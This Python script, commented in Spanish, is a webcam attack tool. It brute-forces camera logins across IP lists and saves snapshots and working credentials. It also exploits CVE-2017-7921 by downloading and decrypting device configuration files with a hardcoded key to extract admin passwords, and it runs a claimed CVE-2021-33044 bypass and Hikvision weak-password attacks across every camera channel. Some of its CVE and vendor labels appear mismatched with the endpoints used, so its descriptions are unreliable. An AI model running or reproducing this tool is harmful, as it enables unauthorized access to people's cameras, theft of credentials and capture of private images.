#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Escáner de cámaras web y explotación de vulnerabilidades Dahua con cuatro modos:
  1. scan: Escaneo asíncrono para obtener snapshots usando combinaciones de credenciales.
  2. cve2017: Explotación de CVE-2017-7921 (descifrado del archivo de configuración).
  3. cve2021: Explotación de CVE-2021-33044 (bypass de autenticación).
  4. hikvision: Explotación de la vulnerabilidad de weak password en dispositivos Hikvision.

En los modos CVE y en el modo hikvision se asume que las credenciales por defecto son:
    usuario: admin
    contraseña: 11

Los snapshots se guardan en la carpeta "pics" con nombres que incluyen datos relevantes.
    - En modo scan: se guarda con el orden: ip_password_username_port.jpg
    - En modo hikvision: se guarda con el orden: ip-port-channel-user-password.jpg

Uso:
    Modo scan:
        python3 improved_scanner.py scan -H host.txt -u user.txt -p pass.txt -P 80 -t 15 -c 100
    Modo cve2017:
        python3 improved_scanner.py cve2017 -t target.txt
    Modo cve2021:
        python3 improved_scanner.py cve2021 -t target.txt
    Modo hikvision:
        python3 improved_scanner.py hikvision -t target.txt -u user.txt -p pass.txt
"""

import argparse
import asyncio
import os
import sys
import ipaddress
import re
import base64
from itertools import cycle
from pathlib import Path
from io import BytesIO
import xml.etree.ElementTree as ElementTree

import httpx
import requests
from requests.auth import HTTPDigestAuth
from colorama import Fore, Style, init as colorama_init
from loguru import logger
from itertools import cycle  # ya se importa para el XOR en otros modos

# Para el cifrado/descifrado en el modo CVE-2017-7921
from Crypto.Cipher import AES

# Inicializar colorama
colorama_init(autoreset=True)

# Logo para mostrar al inicio
LOGO = r"""
   ___       __                     
  / _ \___ _/ /____ ____  ___ _  __
 / , _/ -_) / __/ -_) __/ / _ \ |/ /
/_/|_|\__/_/\__/\__/_/    \___/___/  
       Webcam Vulnerability Scanner
         TG: @SlickMercy
"""

#########################
# Funciones auxiliares comunes
#########################

def get_ip_port(target: str, default_port=80):
    """
    A partir de target (puede ser "ip" o "ip:puerto") retorna (ip, puerto).
    """
    if ":" in target:
        parts = target.split(":")
        return parts[0], parts[1]
    else:
        return target, str(default_port)

def param_to_list(param: str):
    """Si param es una ruta a un archivo, lo lee; si no, lo separa por comas."""
    path = Path(param)
    result = set()
    if path.exists() and path.is_file():
        with open(path, encoding='utf-8', errors='ignore') as file:
            for line in file:
                line = line.strip()
                if line:
                    result.add(line)
        return list(result)
    else:
        return [x.strip() for x in param.split(',') if x.strip()]

def retrieve_snapshot(ip: str, username: str, password: str, port: int = 80, timeout: int = 10):
    """
    Intenta obtener el snapshot de la cámara usando el endpoint conocido.
    Guarda la imagen en "pics" con el nombre: ip_password_username_port.jpg.
    """
    snapshot_url = f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture"
    auth_str = f"{username}:{password}"
    auth_b64 = base64.b64encode(auth_str.encode('utf-8')).decode('utf-8')
    headers = {
        "Authorization": f"Basic {auth_b64}",
        "Accept": "application/octet-stream",
        "User-Agent": "Mozilla/5.0"
    }
    try:
        r = requests.get(snapshot_url, headers=headers, timeout=timeout, verify=False)
        if r.status_code == 200 and "image/jpeg" in r.headers.get("Content-Type", ""):
            if not os.path.exists("pics"):
                os.makedirs("pics")
            filename = f"pics/{ip}_{password}_{username}_{port}.jpg"
            with open(filename, "wb") as f_pic:
                f_pic.write(r.content)
            print(Fore.BLUE + f"[+] Snapshot guardada: {filename}" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + f"[!] No se pudo obtener snapshot de {ip} (HTTP {r.status_code})" + Style.RESET_ALL)
    except Exception as e:
        logger.error(f"Error al obtener snapshot de {ip}: {e}")

def snapshot_hikvision(url: str, img_file_name: str, auth, timeout: int = 10):
    """
    Función auxiliar para obtener y guardar una imagen de un dispositivo Hikvision.
    Devuelve 1 si se guarda la imagen exitosamente, 0 en caso contrario.
    """
    try:
        r = requests.get(url, auth=auth, timeout=timeout, verify=False)
        if r.status_code == 200 and "image/jpeg" in r.headers.get("Content-Type", ""):
            if not os.path.exists("pics"):
                os.makedirs("pics")
            with open(os.path.join("pics", img_file_name), "wb") as f:
                f.write(r.content)
            print(Fore.BLUE + f"[+] Imagen guardada: {img_file_name}" + Style.RESET_ALL)
            return 1
        else:
            print(Fore.YELLOW + f"[!] No se pudo obtener imagen en {url} (HTTP {r.status_code})" + Style.RESET_ALL)
            return 0
    except Exception as e:
        logger.error(f"Error en snapshot_hikvision: {e}")
        return 0

#########################
# MODO "scan" - Escaneo asíncrono de cámaras con snapshots
#########################

async def check_camera(ip, usernames, passwords, port=80, timeout=15):
    """
    Comprueba si en la IP dada existe la página de login y, en caso afirmativo,
    recorre combinaciones de credenciales para intentar obtener un snapshot.
    El snapshot se guarda con nombre: ip_password_username_port.jpg.
    """
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(timeout)) as client:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/91.0.4472.124 Safari/537.36"
            }
            login_url = f"http://{ip}:{port}/doc/page/login.asp?_"
            response = await client.get(login_url, headers=headers)
            if response.status_code == 200:
                print(Fore.BLUE + f"[+] Página de login encontrada en {ip}" + Style.RESET_ALL)
                with open("Online.txt", "a") as f_online:
                    f_online.write(ip + "\n")
                # Prueba las combinaciones de usuario/contraseña
                for username in usernames:
                    for password in passwords:
                        auth_bytes = f"{username}:{password}".encode('utf-8')
                        auth_b64 = base64.b64encode(auth_bytes).decode('utf-8')
                        auth_headers = {
                            "Authorization": f"Basic {auth_b64}",
                            "Accept": "application/octet-stream",
                            "User-Agent": headers["User-Agent"]
                        }
                        snapshot_url = f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture"
                        try:
                            snap_resp = await client.get(snapshot_url, headers=auth_headers, timeout=5)
                            if snap_resp.status_code == 200 and "image/jpeg" in snap_resp.headers.get("Content-Type", ""):
                                print(Fore.GREEN + f"[+] {ip} -> Autenticado como {username}:{password}" + Style.RESET_ALL)
                                if not os.path.exists("pics"):
                                    os.makedirs("pics")
                                filename = f"pics/{ip}_{password}_{username}_{port}.jpg"
                                with open(filename, "wb") as f_pic:
                                    f_pic.write(snap_resp.content)
                                print(Fore.BLUE + f"[+] Snapshot guardada: {filename}" + Style.RESET_ALL)
                                with open("info.txt", "a") as f_info:
                                    f_info.write(f"IP: {ip}, Usuario: {username}, Contraseña: {password}\n")
                                return  # Salir tras el primer éxito
                        except (httpx.RequestError, asyncio.TimeoutError) as e:
                            logger.error(f"Error al obtener snapshot de {ip}: {e}")
                            continue
            else:
                print(Fore.YELLOW + f"[!] Página de login NO encontrada en {ip}" + Style.RESET_ALL)
    except (httpx.RequestError, asyncio.TimeoutError) as e:
        print(Fore.RED + f"[-] Conexión a {ip} agotada: {e}" + Style.RESET_ALL)
    except Exception as e:
        logger.exception(f"Error inesperado en {ip}: {e}")

async def scan_host(ip_str, usernames, passwords, port, timeout, semaphore):
    """
    Valida la IP y ejecuta check_camera limitando la concurrencia con un semáforo.
    """
    async with semaphore:
        try:
            ip = ipaddress.ip_address(ip_str)
        except ValueError:
            print(Fore.RED + f"[-] {ip_str} no es una dirección IP válida" + Style.RESET_ALL)
            return
        await check_camera(str(ip), usernames, passwords, port, timeout)

async def main_scan(args):
    with open(args.hosts, "r") as f:
        host_list = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    with open(args.user, "r") as f:
        user_list = [line.strip() for line in f if line.strip()]
    with open(args.password, "r") as f:
        pass_list = [line.strip() for line in f if line.strip()]

    if not host_list:
        print(Fore.RED + "No se encontraron hosts válidos." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + LOGO + Style.RESET_ALL)
    if not os.path.exists("pics"):
        os.makedirs("pics")

    semaphore = asyncio.Semaphore(args.concurrency)
    tasks = [
        asyncio.create_task(scan_host(ip, user_list, pass_list, args.port, args.timeout, semaphore))
        for ip in host_list
    ]
    await asyncio.gather(*tasks)
    print(Fore.GREEN + "Escaneo completado (modo scan)." + Style.RESET_ALL)

#########################
# MODO "cve2017" - Exploitar CVE-2017-7921 (descifrado del archivo de configuración)
#########################

def add_to_16(s: bytes) -> bytes:
    while len(s) % 16 != 0:
        s += b'\0'
    return s

def decrypt_config(ciphertext: bytes, hex_key='279977f62f6cfd2d91cd75b889ce0c9a') -> bytes:
    key = bytes.fromhex(hex_key)
    ciphertext = add_to_16(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_ECB)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def xore(data: bytes, key=bytearray([0x73, 0x8B, 0x55, 0x44])) -> bytes:
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

def strings_from_data(data: str, min_length=2):
    regex = f"[A-Za-z0-9/\\-:.,_$%'()[\\]<> ]{{{min_length},}}"
    return re.findall(regex, data)

def enmuration(lst, keyword='admin'):
    return [i for i, e in enumerate(lst) if e == keyword]

def run_cve2017(args):
    targets = param_to_list(args.target)
    if not targets:
        print(Fore.RED + "No se encontraron targets válidos para el modo cve2017." + Style.RESET_ALL)
        return
    print(Fore.YELLOW + LOGO + Style.RESET_ALL)
    print(Fore.CYAN + f"Iniciando explotación CVE-2017-7921 en {len(targets)} targets..." + Style.RESET_ALL)
    default_user = "admin"
    default_pass = "11"
    for target in targets:
        try:
            url = f"http://{target}/System/configurationFile?auth=YWRtaW46MTEK"
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200:
                with BytesIO(decrypt_config(r.content)) as f:
                    data = f.read()
                xor_data = xore(data)
                decoded = xor_data.decode('ISO-8859-1', errors='ignore')
                result_list = strings_from_data(decoded)
                indices = enmuration(result_list, keyword='admin')
                if indices:
                    index = indices[-1]
                    try:
                        extracted = result_list[index] + ',' + result_list[index + 1]
                    except IndexError:
                        extracted = result_list[index]
                    print(Fore.GREEN + f"{target} -> {extracted}" + Style.RESET_ALL)
                    ip, port_str = get_ip_port(target)
                    port_val = int(port_str) if port_str.isdigit() else 80
                    retrieve_snapshot(ip, default_user, default_pass, port=port_val)
                else:
                    print(Fore.YELLOW + f"{target} -> No se extrajeron datos" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"{target} -> fallo (HTTP {r.status_code})" + Style.RESET_ALL)
        except requests.exceptions.RequestException as e:
            logger.error(f"Error en {target}: {e}")
    print(Fore.GREEN + "Ejecución finalizada (modo cve2017)." + Style.RESET_ALL)

#########################
# MODO "cve2021" - Exploitar CVE-2021-33044 (bypass de autenticación)
#########################

def run_cve2021(args):
    targets = param_to_list(args.target)
    if not targets:
        print(Fore.RED + "No se encontraron targets válidos para el modo cve2021." + Style.RESET_ALL)
        return
    print(Fore.YELLOW + LOGO + Style.RESET_ALL)
    print(Fore.CYAN + f"Iniciando explotación CVE-2021-33044 en {len(targets)} targets..." + Style.RESET_ALL)
    default_user = "admin"
    default_pass = "11"
    for target in targets:
        try:
            url = f"http://{target}/cgi-bin/vw.cgi?cmd=getLocalCfgByFile&file=app.ini&auth=YWRtaW46MTEK"
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200:
                if "admin" in r.text.lower() or "device" in r.text.lower():
                    print(Fore.GREEN + f"{target} -> Vulnerable (datos extraídos)" + Style.RESET_ALL)
                    with open("info2021.txt", "a") as f_info:
                        f_info.write(f"{target}: {r.text}\n")
                    ip, port_str = get_ip_port(target)
                    port_val = int(port_str) if port_str.isdigit() else 80
                    retrieve_snapshot(ip, default_user, default_pass, port=port_val)
                else:
                    print(Fore.YELLOW + f"{target} -> Respuesta recibida pero sin indicadores claros" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"{target} -> fallo (HTTP {r.status_code})" + Style.RESET_ALL)
        except requests.exceptions.RequestException as e:
            logger.error(f"Error en {target}: {e}")
    print(Fore.GREEN + "Ejecución finalizada (modo cve2021)." + Style.RESET_ALL)

#########################
# MODO "hikvision" - Exploitar weak password en dispositivos Hikvision
#########################

def run_hikvision(args):
    """
    Para cada target se prueba la vulnerabilidad de weak password en Hikvision.
    Se itera sobre cada combinación de usuario y contraseña, intentando acceder a:
       http://{ip}:{port}/ISAPI/Security/userCheck
    Si se detecta vulnerabilidad (respuesta 200 y ciertos indicadores en el XML), se procede a:
       - Consultar el número de canales (desde /ISAPI/Image/channels) usando HTTPDigestAuth.
       - Para cada canal, descargar el snapshot desde:
         /ISAPI/Streaming/channels/{channel}01/picture
         y guardarlo con el nombre: ip-port-channel-user-password.jpg
    """
    targets = param_to_list(args.target)
    if not targets:
        print(Fore.RED + "No se encontraron targets válidos para el modo hikvision." + Style.RESET_ALL)
        return
    with open(args.user, "r") as f:
        user_list = [line.strip() for line in f if line.strip()]
    with open(args.password, "r") as f:
        pass_list = [line.strip() for line in f if line.strip()]
    if not user_list or not pass_list:
        print(Fore.RED + "No se encontraron usuarios o contraseñas para probar." + Style.RESET_ALL)
        return

    print(Fore.YELLOW + LOGO + Style.RESET_ALL)
    print(Fore.CYAN + f"Iniciando prueba de weak password en {len(targets)} targets (Hikvision)..." + Style.RESET_ALL)
    for target in targets:
        ip, port_str = get_ip_port(target)
        port_val = int(port_str) if port_str.isdigit() else 80
        vulnerable = False
        for user in user_list:
            for password in pass_list:
                try:
                    url = f"http://{ip}:{port_val}/ISAPI/Security/userCheck"
                    r = requests.get(url, auth=(user, password), timeout=10, verify=False, headers={'Connection': 'close', 'User-Agent': 'Mozilla/5.0'})
                    if (r.status_code == 200 and 'userCheck' in r.text and 
                        'statusValue' in r.text and '200' in r.text):
                        print(Fore.GREEN + f"{target} -> Vulnerable con {user}:{password}" + Style.RESET_ALL)
                        vulnerable = True
                        # Consultar número de canales usando Digest Auth
                        try:
                            res = requests.get(f"http://{ip}:{port_val}/ISAPI/Image/channels",
                                               auth=HTTPDigestAuth(user, password),
                                               timeout=10, verify=False, headers={'Connection': 'close', 'User-Agent': 'Mozilla/5.0'})
                            channels_xml = ElementTree.fromstring(res.text)
                            channels = len(channels_xml)
                        except Exception as e:
                            logger.error(f"Error al obtener canales de {target}: {e}")
                            channels = 1
                        # Para cada canal, obtener snapshot
                        for channel in range(1, channels + 1):
                            url_snapshot = f"http://{ip}:{port_val}/ISAPI/Streaming/channels/{channel}01/picture"
                            img_file_name = f"{ip}-{port_val}-channel{channel}-{user}-{password}.jpg"
                            snapshot_hikvision(url_snapshot, img_file_name, auth=HTTPDigestAuth(user, password), timeout=10)
                        # Registra en info
                        with open("info_hikvision.txt", "a") as f_info:
                            f_info.write(f"{target} -> {user}:{password}\n")
                        break  # Sale del loop de contraseñas
                except Exception as e:
                    logger.error(f"Error al probar {target} con {user}:{password}: {e}")
            if vulnerable:
                break  # Ya se encontró combinación vulnerable para este target
        if not vulnerable:
            print(Fore.YELLOW + f"{target} -> No vulnerable en weak password" + Style.RESET_ALL)
    print(Fore.GREEN + "Ejecución finalizada (modo hikvision)." + Style.RESET_ALL)

#########################
# Flujo principal y argumentos
#########################

def main():
    parser = argparse.ArgumentParser(
        description="Escáner de cámaras web y explotación de vulnerabilidades Dahua."
    )
    subparsers = parser.add_subparsers(dest="mode", help="Modo de ejecución")

    # Modo scan
    scan_parser = subparsers.add_parser("scan", help="Escaneo asíncrono para obtener snapshots")
    scan_parser.add_argument("-H", "--hosts", type=str, default="host.txt",
                             help="Archivo con IPs a escanear (una por línea)")
    scan_parser.add_argument("-u", "--user", type=str, default="user.txt",
                             help="Archivo con nombres de usuario")
    scan_parser.add_argument("-p", "--password", type=str, default="pass.txt",
                             help="Archivo con contraseñas")
    scan_parser.add_argument("-P", "--port", type=int, default=80,
                             help="Puerto de acceso (por defecto: 80)")
    scan_parser.add_argument("-t", "--timeout", type=int, default=15,
                             help="Timeout en segundos para cada conexión (por defecto: 15)")
    scan_parser.add_argument("-c", "--concurrency", type=int, default=100,
                             help="Número de conexiones concurrentes (por defecto: 100)")

    # Modo cve2017
    cve_parser = subparsers.add_parser("cve2017", help="Explotación de CVE-2017-7921")
    cve_parser.add_argument("-t", "--target", type=str, default="target.txt",
                            help="IP:puerto o archivo (lista de targets)")

    # Modo cve2021
    cve2021_parser = subparsers.add_parser("cve2021", help="Explotación de CVE-2021-33044")
    cve2021_parser.add_argument("-t", "--target", type=str, default="target.txt",
                               help="IP:puerto o archivo (lista de targets)")

    # Modo hikvision (weak password)
    hik_parser = subparsers.add_parser("hikvision", help="Explotación de weak password en dispositivos Hikvision")
    hik_parser.add_argument("-t", "--target", type=str, default="target.txt",
                            help="IP:puerto o archivo (lista de targets)")
    hik_parser.add_argument("-u", "--user", type=str, default="user.txt",
                            help="Archivo con nombres de usuario")
    hik_parser.add_argument("-p", "--password", type=str, default="pass.txt",
                            help="Archivo con contraseñas")

    args = parser.parse_args()

    if args.mode == "scan":
        asyncio.run(main_scan(args))
    elif args.mode == "cve2017":
        run_cve2017(args)
    elif args.mode == "cve2021":
        run_cve2021(args)
    elif args.mode == "hikvision":
        run_hikvision(args)
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Ejecución interrumpida por el usuario." + Style.RESET_ALL)
        sys.exit(0)
